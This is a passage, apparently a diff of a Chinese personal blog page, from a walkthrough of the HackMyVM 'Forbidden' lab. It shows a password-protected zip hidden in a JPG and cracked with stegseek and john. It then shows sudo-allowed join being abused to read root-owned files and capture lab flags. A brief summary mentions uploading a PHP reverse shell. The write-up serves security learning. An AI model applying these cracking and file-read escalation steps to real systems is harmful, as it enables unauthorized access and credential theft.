+<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>www用户没有sudo权限<br>然后根据上面web的提示，要找到jpg文件<br>找到了之后发现有python3 直接用python3开启http服务，本机上wget下载这个图片</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="RUBY"><figure class="iseeu highlight /ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">www-data<span class="variable">@forbidden</span><span class="symbol">:/home</span><span class="variable">$ </span>find / -name <span class="string">&quot;*.jpg&quot;</span> -print <span class="number">2</span>&gt;<span class="regexp">/dev/null</span></span><br><span class="line">/var/www/html/<span class="variable constant_">TOPSECRETIMAGE</span>.jpg</span><br><span class="line"></span><br><span class="line">www-data<span class="variable">@forbidden</span><span class="symbol">:~/html</span><span class="variable">$ </span>which python3</span><br><span class="line">/usr/bin/python3</span><br><span class="line">www-data<span class="variable">@forbidden</span><span class="symbol">:~/html</span><span class="variable">$ </span>python3 -m http.server</span><br><span class="line"><span class="title class_">Serving</span> <span class="variable constant_">HTTP</span> on <span class="number">0.0</span>.<span class="number">0.0</span> port <span class="number">8000</span> (<span class="symbol">http:</span>/<span class="regexp">/0.0.0.0:8000/</span>) ...</span><br></pre></td></tr></table></figure></div>
+<p>用stegseek破解一下这个图片</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NIX"><figure class="iseeu highlight /nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~<span class="operator">/</span>tmp]</span><br><span class="line">└─<span class="comment"># stegseek  -f TOPSECRETIMAGE.jpg -wl rockyou.txt </span></span><br><span class="line">StegSeek <span class="number">0.6</span> <span class="operator">-</span> https:<span class="symbol">//github.com/RickdeJager/StegSeek</span></span><br><span class="line"></span><br><span class="line">[i] Found <span class="params">passphrase:</span> <span class="string">&quot;portugal&quot;</span></span><br><span class="line">[i] Original <span class="params">filename:</span> <span class="string">&quot;pass.zip&quot;</span>.</span><br><span class="line">[i] Extracting to <span class="string">&quot;TOPSECRETIMAGE.jpg.out&quot;</span>.</span><br><span class="line"></span><br><span class="line">┌──(root㉿kakeru)-[~<span class="operator">/</span>tmp]</span><br><span class="line">└─<span class="comment"># steghide extract -sf TOPSECRETIMAGE.jpg        </span></span><br><span class="line">Enter <span class="params">passphrase:</span> </span><br><span class="line">wrote extracted data to <span class="string">&quot;pass.zip&quot;</span>.</span><br><span class="line"></span><br><span class="line">┌──(root㉿kakeru)-[~<span class="operator">/</span>tmp]</span><br><span class="line">└─<span class="comment"># unzip TOPSECRETIMAGE.jpg.out </span></span><br><span class="line"><span class="params">Archive:</span>  TOPSECRETIMAGE.jpg.out</span><br><span class="line">[TOPSECRETIMAGE.jpg.out] pass.txt <span class="params">password:</span> </span><br><span class="line">password <span class="params">incorrect--reenter:</span> </span><br><span class="line">password <span class="params">incorrect--reenter:</span>    </span><br><span class="line"></span><br><span class="line">┌──(root㉿kakeru)-[~<span class="operator">/</span>tmp]</span><br><span class="line">└─<span class="comment"># unzip pass.zip </span></span><br><span class="line"><span class="params">Archive:</span>  pass.zip</span><br><span class="line">[pass.zip] pass.txt <span class="params">password:</span> </span><br><span class="line">password <span class="params">incorrect--reenter:</span> </span><br><span class="line">password <span class="params">incorrect--reenter:</span> </span><br><span class="line">   <span class="params">skipping:</span> pass.txt                incorrect password</span><br></pre></td></tr></table></figure></div>
+<p>但是发现用这个爆破出来的passphrase只能获取zip,不是zip的解压密码，所以用zip2john把这个zip变成可以让john爆破的形式</p>
+<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">                                                                                                                                                       </span><br><span class="line">┌──<span class="params">(root㉿kakeru)</span>-[~<span class="string">/tmp</span>]</span><br><span class="line">└─<span class="comment"># zip2john pass.zip &gt; tmp </span></span><br><span class="line">ver 2.0 efh 5455 efh 7875 pass.zip/pass.txt PKZIP Encr: TS_chk, cmplen=66, decmplen=71, crc=E22A2397 ts=9831 cs=9831 type=8</span><br><span class="line">                                                                                                                                                        </span><br><span class="line">┌──<span class="params">(root㉿kakeru)</span>-[~<span class="string">/tmp</span>]</span><br><span class="line">└─<span class="comment"># john tmp                                                                                   </span></span><br><span class="line">Using default input encoding: UTF-8</span><br><span class="line">Loaded 1 password hash <span class="params">(PKZIP [32/64])</span></span><br><span class="line">Will run 4 OpenMP threads</span><br><span class="line">Proceeding with single, rules<span class="function">:Single</span></span><br><span class="line">Press &#x27;q&#x27; or Ctrl-C to abort, almost any other key for status</span><br><span class="line">Almost done: Processing the remaining buffered candidate passwords, <span class="keyword">if</span> any.</span><br><span class="line">Proceeding with wordlist:<span class="string">/usr/share/john/password.lst</span></span><br><span class="line">secret           <span class="params">(pass.zip/pass.txt)</span>     </span><br><span class="line">1g 0<span class="function">:00</span><span class="function">:00</span><span class="function">:00</span> DONE 2/3 <span class="params">(2025-03-02 16:34)</span> 100.0g/s 3069Kp/s 3069Kc/s 3069KC/s 123456.<span class="string">.ferrises</span></span><br><span class="line">Use the <span class="string">&quot;--show&quot;</span> option to display all of the cracked passwords reliably</span><br><span class="line">Session completed. </span><br><span class="line">                                                                                                                                                        </span><br><span class="line">┌──<span class="params">(root㉿kakeru)</span>-[~<span class="string">/tmp</span>]</span><br><span class="line">└─<span class="comment"># unzip pass.zip              </span></span><br><span class="line">Archive:  pass.zip</span><br><span class="line">[pass.zip] pass.txt password: </span><br><span class="line">replace pass.txt? [y]es, [n]o, [A]ll, [N]one, [r]ename: y</span><br><span class="line">  inflating: pass.txt                </span><br><span class="line">                                                                                                                                                        </span><br><span class="line">┌──<span class="params">(root㉿kakeru)</span>-[~<span class="string">/tmp</span>]</span><br><span class="line">└─<span class="comment"># cat pass.txt</span></span><br><span class="line">- <span class="string">....</span> .</span><br><span class="line"><span class="string">.--.</span> <span class="string">.-</span> <span class="string">...</span> <span class="string">...</span> <span class="string">.--</span> <span class="params">---</span> <span class="string">.-.</span> -<span class="string">..</span></span><br><span class="line"><span class="string">..</span> <span class="string">...</span> <span class="params">---</span><span class="string">...</span></span><br><span class="line"></span><br><span class="line">vGffXfDreF453!</span><br></pre></td></tr></table></figure>
+<p><img src="https://pic1.imgdb.cn/item/67c4189ad0e0a243d409f6d2.png"></p>
+<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">┌──<span class="params">(root㉿kakeru)</span>-[~<span class="string">/tmp</span>]</span><br><span class="line">└─<span class="comment"># cat pass.txt</span></span><br><span class="line">- <span class="string">....</span> .</span><br><span class="line"><span class="string">.--.</span> <span class="string">.-</span> <span class="string">...</span> <span class="string">...</span> <span class="string">.--</span> <span class="params">---</span> <span class="string">.-.</span> -<span class="string">..</span></span><br><span class="line"><span class="string">..</span> <span class="string">...</span> <span class="params">---</span><span class="string">...</span></span><br><span class="line"></span><br><span class="line">vGffXfDreF453!</span><br><span class="line">                                                                                                                                                        </span><br><span class="line">┌──<span class="params">(root㉿kakeru)</span>-[~<span class="string">/tmp</span>]</span><br><span class="line">└─<span class="comment"># echo vGffXfDreF453 | base64 -d                           </span></span><br><span class="line">¼gß]ðëx^9base64: invalid input</span><br></pre></td></tr></table></figure>
+<p>我尝试用<code>vGffXfDreF453</code>这个密码，发现不是哪一个用户的密码<br>这里没有思路了，看了下wp，返现这个jpg文件的名字就是密码，，，啊  这个名字确实很奇怪，还是大写的，应该注意到的😲</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ELIXIR"><figure class="iseeu highlight /elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">marta<span class="variable">@forbidden</span><span class="symbol">:~</span><span class="variable">$ </span>sudo -l</span><br><span class="line"><span class="title class_">Matching</span> <span class="title class_">Defaults</span> entries <span class="keyword">for</span> marta on <span class="symbol">forbidden:</span></span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\<span class="symbol">:/usr/local/bin</span>\<span class="symbol">:/usr/sbin</span>\<span class="symbol">:/usr/bin</span>\<span class="symbol">:/sbin</span>\<span class="symbol">:/bin</span></span><br><span class="line"></span><br><span class="line"><span class="title class_">User</span> marta may run the following commands on <span class="symbol">forbidden:</span></span><br><span class="line">    (<span class="title class_">ALL</span> : <span class="title class_">ALL</span>) <span class="symbol">NOPASSWD:</span> /usr/bin/join</span><br></pre></td></tr></table></figure></div>
+<p>在gtfobins里面可以找到提权方法，这个join命令是根据两个文件的共同字段合并行，类似于 SQL 的 JOIN 操作。可以利用这个读取任意文件<br><code>sudo join -a 2 /dev/null $LFILE</code>  -a 2这个参数的意思是输出第二个文件中所有行，即使这些行在第一个文件中没有匹配项。</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">marta@forbidden:/home$ <span class="built_in">sudo</span> /usr/bin/join -a 2 /dev/null /home/markos/user.txt     </span><br><span class="line">HMVpussycat</span><br><span class="line"></span><br><span class="line">marta@forbidden:~$ <span class="built_in">sudo</span> /usr/bin/join -a 2 /dev/null /root/root.txt</span><br><span class="line">HMVmymymymymind</span><br></pre></td></tr></table></figure></div>
+
+
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>对ftp的用法更加了解，包括上传文件和下载文件， 对于可以控制www目录的时候应该更加注意，可以上传反弹shell 的php<br>在不能用php的时候考虑不同的扩展名<br>对于一些文件的名字也要更加敏感，包括一些看起来像密码的文件名<br>学习到了join命令是什么，以及利用的方法</p>
+
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>guayu-kakeru
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://guayu-kakeru.github.io/posts/26924.html" title="HMV-Forbidden">https://guayu-kakeru.github.io/posts/26924.html</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E6%B8%97%E9%80%8F/" rel="tag"># 渗透</a>
+              <a href="/tags/HMV/" rel="tag"># HMV</a>
+              <a href="/tags/%E9%9D%B6%E5%9C%BA/" rel="tag"># 靶场</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/posts/37808.html" rel="prev" title="SSRF漏洞学习笔记">
+      <i class="fa fa-chevron-left"></i> SSRF漏洞学习笔记
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-text">端口扫描&#x2F;信息收集</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web%E6%8E%A2%E6%B5%8B"><span class="nav-text">web探测</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%8F%90%E6%9D%83"><span class="nav-text">提权</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-text">总结</span></a></li></ol></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="guayu-kakeru"
+      src="/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">guayu-kakeru</p>
+  <div class="site-description" itemprop="description">一年过后，你会希望从今天就开始行动。</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">56</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">12</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">14</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/guayu-kakeru" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;guayu-kakeru" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="/1806449041@qq.com" title="E-Mail → 1806449041@qq.com"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+
+  <div class="links-of-recent-posts motion-element">
+    <div class="links-of-recent-posts-title">
+      <i class="fa fa-history fa-fw"></i>
+      最近文章
+    </div>
+    <ul class="links-of-recent-posts-list">
+        <li class="links-of-recent-posts-item">
+          <a href="/posts/26924.html" title="posts&#x2F;26924.html">HMV-Forbidden</a>
+        </li>
+        <li class="links-of-recent-posts-item">
+          <a href="/posts/37808.html" title="posts&#x2F;37808.html">SSRF漏洞学习笔记</a>
+        </li>
+        <li class="links-of-recent-posts-item">
+          <a href="/posts/11248.html" title="posts&#x2F;11248.html">XXE漏洞学习笔记</a>
+        </li>
+        <li class="links-of-recent-posts-item">
+          <a href="/posts/963.html" title="posts&#x2F;963.html">HMV-Learn2Code</a>
+        </li>
+        <li class="links-of-recent-posts-item">
+          <a href="/posts/28713.html" title="posts&#x2F;28713.html">MoeCTF_2023web</a>
+        </li>
+    </ul>
+  </div>
+      </div>
+
+      
+      
+        <div class="links-of-blogroll motion-element links-of-blogroll-undefined">
+          <div class="links-of-blogroll-title">
+            <i class="fa fa-history fa-" aria-hidden="true"></i>
+            
+          </div>
+          <ul class="links-of-blogroll-list">
+            
+            
+              <li class="recent_posts_li">
+                <a href="/" title="" target="_blank"></a>
+              </li>
+            
+              <li class="recent_posts_li">
+                <a href="/" title="" target="_blank"></a>
+              </li>
+            
+              <li class="recent_posts_li">
+                <a href="/" title="" target="_blank"></a>
+              </li>
+            
+              <li class="recent_posts_li">
+                <a href="/" title="" target="_blank"></a>
+              </li>
+            
+              <li class="recent_posts_li">
+                <a href="/" title="" target="_blank"></a>
+              </li>
+            
+          </ul>
+        </div>
+      
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2025</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">guayu-kakeru</span>
+</div>
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
